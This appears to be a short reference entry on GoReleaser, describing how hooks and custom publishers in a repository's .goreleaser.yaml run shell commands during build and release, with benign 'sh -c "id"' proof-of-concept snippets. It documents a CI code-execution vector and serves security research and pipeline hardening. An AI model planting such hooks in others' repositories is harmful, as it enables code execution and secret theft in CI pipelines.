---
title: GoReleaser
tags:
  - cli
  - config-file
  - eval-sh
references: 
- https://goreleaser.com/customization/hooks/
- https://goreleaser.com/customization/publishers/#how-it-works
files: [.goreleaser.yaml]
---

`goreleaser` and its github action `goreleaser/goreleaser-action` is configure using a local `.goreleaser.yaml`.

## build

`goreleaser build` allows RCE via hooks:

```yaml
before:
  hooks:
    - sh -c "id"
```

## release

`goreleaser release` allows RCE via hooks and custom publishers:

```yaml
before:
  hooks:
    - sh -c "id"
publishers:
  - name: poc
    cmd: sh -c "id"
```

*Note: `publishers` requires a new tag, which should be already defined if a workflow uses `goreleaser`
